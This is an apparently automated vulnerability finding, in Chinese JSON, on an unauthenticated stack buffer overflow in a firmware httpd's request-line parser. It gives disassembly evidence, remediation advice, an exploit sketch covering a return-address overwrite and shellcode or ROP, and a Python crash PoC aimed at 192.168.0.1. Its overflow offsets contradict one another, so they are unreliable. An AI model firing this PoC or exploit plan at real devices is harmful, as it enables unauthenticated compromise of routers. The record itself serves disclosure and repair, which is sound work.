{
  "job_id": "9160aafaa095",
  "title": "httpd 请求行解析 URL 栈缓冲区溢出（sscanf %[^ ] 无长度限制，覆盖返回地址）",
  "severity": "critical",
  "confidence": 0.7,
  "vuln_class": "栈缓冲区溢出",
  "cwe": "CWE-121",
  "binary_md5": "b18be6d07f1c97903c063686924ed3c7",
  "binary_path": "firmware/binwalk_extracted/firmware.extracted/0/decrypted.bin.extracted/56CD97/squashfs-root/bin/httpd",
  "reachability": "static-only",
  "summary": "httpd 的 HTTP 请求处理线程入口 sub_408A0C（syslog 内名 \"handleIncoming\"）在读取请求行后，用 sscanf(v10, \" %[^ ] HTTP/%d.%*d\", v4, &v163) 把 URL 解析到栈上缓冲区 v4。\n\n该转换符 %[^ ] 没有任何字段宽度限制，会把整段以空格/制表符结尾的 URL 一次性写入 v4。CFG/汇编显示 v4 指向 fp-0x6C（0x408a98: addiu $s0, $fp, 0x3308+var_6C，0x408c30: move $a2, $s2 作为 sscanf 的写入目标），即只有约 108 字节的合法空间（到第一个后续对象 v151 为止）。\n\n接收侧的越界保护形同虚设：sub_406074 逐字节读入时只以全局 dword_4ED46C（=httpd.conf 的 buffer_size=4096）为界，并把 4095 字节写进调用者提供的 4096 字节栈缓冲区。随后的 strlen(v4) 上限检查在解析之后才执行、且阈值是 buffer_size-100=3996，既不能阻止写入也不能缩小破坏范围。\n\n因此一条超长 URL 可覆盖 fp-0x200..fp-0x0C..fp+0x0C 的大范围栈内容；溢出约 5696 字节即命中 fp+0x3324 处保存的 $ra。反编译中未见任何栈保护（无 __stack_chk 相关逻辑），被覆盖的 $ra 在函数收尾 jr $ra 时直接生效。",
  "evidence": [
    "CFG sub_408A0C 序言: 0x408a0c addiu $sp,-0x3330；保存寄存器位于 fp+0x3308..fp+0x3324，其中 $ra 在 fp+0x3324",
    "0x408a98 addiu $s0,$fp,0x3308+var_6C（v149, 偏移 -0x6C）",
    "0x408c1c li $t8,0x20 / 0x408c24 sb $t8,0($s4)（把分隔符写回空格）",
    "0x408c2c li $a1,aHttpDD # \" %[^ ] HTTP/%d.%*d\"；0x408c30 move $a2,$s2 => sscanf 把 URL 写入 0x408a98 指定的缓冲区",
    "0x408c34 jal sscanf；0x408c38 addiu $a3,$fp,0x3308+var_34",
    "hexrays sub_408A0C 第275行: if ( sscanf(v10, \" %[^ ] HTTP/%d.%*d\", v4, &v163) <= 0 || *v4 != 47 )",
    "hexrays sub_408A0C: 上限检查位于解析之后，dword_4ED46C - 100 < strlen(v4)（阈值 3996）",
    "hexrays sub_406074: if ( v4 >= dword_4ED46C - 1 ) 才停止追加，v4 最大到 4095；写入目标为调用者传入的 a1（即 sub_408A0C 的 fp-0x32F0 处 4096 字节缓冲区 v152）",
    "etc/httpd.conf 内容 \"buffer_size=4096\\nthread_num=32\\nuir_thread_count=40\"",
    "调用链证据: main -> sub_40D690（accept/setsockopt/SSL_new 的监听循环）-> pthread_create 启动每连接工作线程 sub_408A0C"
  ],
  "session_id": "s-muc9lvva-918b",
  "function_name": "sub_408A0C",
  "preconditions": "无需认证：解析发生在任何鉴权/路由判定之前。需要能向设备 80/tcp 建立 TCP 连接（LAN 侧默认开放）。单条请求行内 URL 长度需 > 约 108 字节即可越界，约 4000 字节即覆盖保存的 $ra。",
  "exploit_sketch": "1) 发送 GET /<约4000个'A'> HTTP/1.1：URL 越过 108 字节缓冲区，破坏 fp-0x200..fp+0x2000 区间的栈对象（含大量函数指针/局部结构）；2) 增量加长 URL 至约 5700 字节，精确落到 fp+0x3324 保存的 $ra；3) 将 $ra 覆写为受控地址。该函数无栈保护（无 canary 逻辑），且 httpd 以 daemon 身份常驻、崩溃后由看护进程重启，适合反复试错。MIPS 无 NX 常见限制，若栈可执行则可直接跳向请求行内的 shellcode；否则需先做信息泄露/ROP 链。注意：具体利用可行性依赖固件运行时的 ASLR/栈可执行性，本次未取得动态证据。",
  "remediation": "1) 给 sscanf 的 %[^ ] 加上宽度限制，使其不超过目标缓冲区实际容量，例如 \" %107[^ ] HTTP/%d.%*d\"，并让该宽度由 v4 的真实长度派生而非硬编码；2) 从根本上让 sub_406074 接受调用者传入的上限参数，而不是用全局 dword_4ED46C，避免调用者缓冲区（108 字节）与实际读取上限（4096 字节）不匹配；3) 把 URL 长度校验移到写入之前；4) 用 strncpy/snprintf 等带界接口替代无界字符串写入，并启用编译器栈保护（-fstack-protector-strong）以便此类越界至少能被检测。",
  "poc": "python3 -c \"\nimport socket\np = b'A'*5700                      # 5700 > 5696 = 距保存 \\$ra 的偏移\nreq = b'GET /' + p + b' HTTP/1.1\\r\\nHost: 192.168.0.1\\r\\n\\r\\n'\ns = socket.create_connection(('192.168.0.1', 80))\ns.sendall(req)\nprint(s.recv(64))\n\"\n# 观察点：httpd 工作线程在 sub_408A0C 收尾 jr \\$ra 时跳向 0x41414141，进程崩溃/重启",
  "call_chain": "main (0x403b7c) → sub_40D690 (0x40d690, accept/监听循环) → pthread_create → sub_408A0C (0x408a0c, handleIncoming) → sub_406074 (0x406074, 按 dword_4ED46C=4096 读请求行) → sscanf \" %[^ ] HTTP/%d.%*d\" 写入 fp-0x6C → 覆盖 fp+0x3324 处保存的 $ra",
  "function_addr": "0x408a0c",
  "id": "F-muc9r1yq-18a0",
  "status": "draft",
  "owner": "token-admin",
  "recorded_at": "2026-09-22T06:04:13Z",
  "history": []
}